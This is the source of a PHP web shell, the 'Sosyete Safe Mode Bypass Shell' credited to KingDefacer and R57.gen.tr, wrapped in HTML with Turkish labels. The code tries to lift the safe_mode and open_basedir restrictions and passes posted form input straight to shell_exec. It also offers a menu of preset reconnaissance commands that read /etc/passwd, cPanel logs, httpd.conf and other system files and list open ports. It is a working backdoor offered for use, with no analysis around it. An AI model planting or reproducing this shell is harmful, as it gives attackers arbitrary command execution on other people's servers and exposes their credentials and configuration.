<html>
 <head>
   <meta http-equiv="Content-Type" content="text/html; charset=windows-1256"><meta http-equiv="Content-Language" content="ar-sa">
   <title>Sosyete Safe Mode Bypass Shell - Edited By KingDefacer</title>
 
   <style>
   td {
   font-family: verdana, arial, ms sans serif, sans-serif;
   font-size: 11px;
   color: #D5ECF9;
   }
   BODY {
   margin-top: 4px;
   margin-right: 4px;
   margin-bottom: 4px;
   margin-left: 4px;
   scrollbar-face-color: #b6b5b5;
   scrollbar-highlight-color: #758393;
   scrollbar-3dlight-color: #000000;
   scrollbar-darkshadow-color: #101842;
   scrollbar-shadow-color: #ffffff;
   scrollbar-arrow-color: #000000;
   scrollbar-track-color: #ffffff;
   }
   A:link {COLOR:blue; TEXT-DECORATION: none}
   A:visited { COLOR:blue; TEXT-DECORATION: none}
   A:active {COLOR:blue; TEXT-DECORATION: none}
   A:hover {color:red;TEXT-DECORATION: none}
   input, textarea, select {
   background-color: #EBEAEA;
   border-style: solid;
   border-width: 1px;
   font-family: verdana, arial, sans-serif;
   font-size: 11px;
   color: #333333;
   padding: 0px;
   }
   </style>
   </head>
    <BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
        <center>
        <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
        <th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
    <p align="center"> </p>
    <p align="center">
    <a bookmark="minipanel">
    <font face="Webdings" size="7" color="#DCE7EF"></font></a><font size="7" face="Martina"></font><span lang="en-us"><font size="3" face="Martina"> </font>
    <br>
        <font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
    </p>
            <a bookmark="minipanel">
    <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
    <p align="center">Sosyete Safe Mode Bypass Shell - Edited By KingDefacer
    <b>
        <font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
   </p>
        <a bookmark="minipanel">
  <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
  <p align="center">~
    <b>


                <p>
    </form>
        </p>
                </td>


    </tr>
            </table>   
     </a>
	 
	 <p>
	 
	     <br>
	         </p>
	
     <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
        <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
  <b>
     </b>
	 <font face="Wingdings 3" size="5"></font><b>Sosyete Safe Mode Bypass Shell ; Bypass shell'lerden esinlenerek bir�ok shell'in ortak karisimi olarak sunulmustur.<span lang="en-us"></span><span lang="en-us"></span> </b><font face="Wingdings 3" size="5"></font></p><p align="center"> </p></td></tr></table> 

</a>


<div align="right">

<span lang="en-us">

        </span>
                        </div>
                </body>
    </html>

 <?


echo "<b><font color=red>Sosyete Bypass Main Menu</font></b><br>";

print_r('




<pre>


<form method="POST" action="">
<b><font color=red> </font></b><input name="sosyete" type="text"><input value="&#199;al&#305;&#351;t&#305;r" type="submit">
</form>
<form method="POST" action="">
<b><font color=red></font><select size="1" name="fuck">
<option value=" ">Sosyete safe mode bypass shell</option>
<option value="id;pwd">id & Dizin</option>
<option value="ls">Dosyalar</option>
<option value="uname -a">Server</option>
<option value="netstat -an | grep -i listen">A&#231;&#305;k Portlar</option>
<option value="ipconfig">A&#287; Bilgisi</option>
<option value="ps -aux">Uygulamalar</option>
<option value="who -q">Kullan&#305;c&#305; Say&#305;s&#305;</option>
<option value="cat /etc/passwd">cat/etc/passwd</option>
<option value="cat /var/cpanel/accounting.log">cat/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">cat/etc/syslog.conf</option>
<option value="cat /etc/hosts">cat/etc/hosts</option>
<option value="cat /etc/named.conf">cat/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">cat/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" value="&#199;al&#305;&#351;t&#305;r">
</form>
</pre>
<style>
   td {
   font-family: verdana, arial, ms sans serif, sans-serif;
   font-size: 11px;
   color: #D5ECF9;
   }
   BODY {
   margin-top: 4px;
   margin-right: 4px;
   margin-bottom: 4px;
   margin-left: 4px;
   scrollbar-face-color: #b6b5b5;
   scrollbar-highlight-color: #758393;
   scrollbar-3dlight-color: #000000;
   scrollbar-darkshadow-color: #101842;
   scrollbar-shadow-color: #ffffff;
   scrollbar-arrow-color: #000000;
   scrollbar-track-color: #ffffff;
   }
   A:link {COLOR:blue; TEXT-DECORATION: none}
   A:visited { COLOR:blue; TEXT-DECORATION: none}
   A:active {COLOR:blue; TEXT-DECORATION: none}
   A:hover {color:red;TEXT-DECORATION: none}
   input, textarea, select {
   background-color: #EBEAEA;
   border-style: solid;
   border-width: 1px;
   font-family: verdana, arial, sans-serif;
   font-size: 11px;
   color: #333333;
   padding: 0px;
   }
  </style></head>
<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
    <th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
<p align="center"> </p>
    <p align="center">
<a bookmark="minipanel">
    <font face="Webdings" size="7" color="#DCE7EF"></font></a><font size="7" face="Martina"></font><span lang="en-us"><font size="3" face="Martina"> </font>
    <br>
<font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
</p>


<div align="right">

<span lang="en-us"> </span></div></body></html>


');
ini_restore("safe_mode");
ini_restore("open_basedir");
$fuck=shell_exec($_POST[sosyete]); 
$mokoko=shell_exec($_POST[fuck]); 
echo "<pre><h4>";
echo "<b><font color=red>Komut Sonucu </font></b><br>"; 
echo $fuck;
echo $mokoko;
echo "</h4></pre>";

?>

</tr>
        </table>    
		
		</a>
		        <p>
				
	<br>
	
	        </p>
			                <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
    <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
    
	<b>
     
	 </b><font face="Wingdings 3" size="5"></font><b><font color="#CC0000">Sosyete Safe Mode Bypass Shell<span lang="en-us"></span> <span lang="en-us"> </span>  </b><font color="#CC0000"><b>Coded by</b> </font><b><span lang="en-us"><a href="http://www.R57.Gen.Tr"><font color="#CC0000">R57.gen.tr</a></span><font color="#CC0000"> ~ <span lang="en-us">Sosyete</span> </b><font face="Wingdings 3" size="5"> </font></p><p align="center"> </p></td></tr></table>

</a>


<div align="right">

<span lang="en-us">

</span>
                </div>
				                </body>

</html>
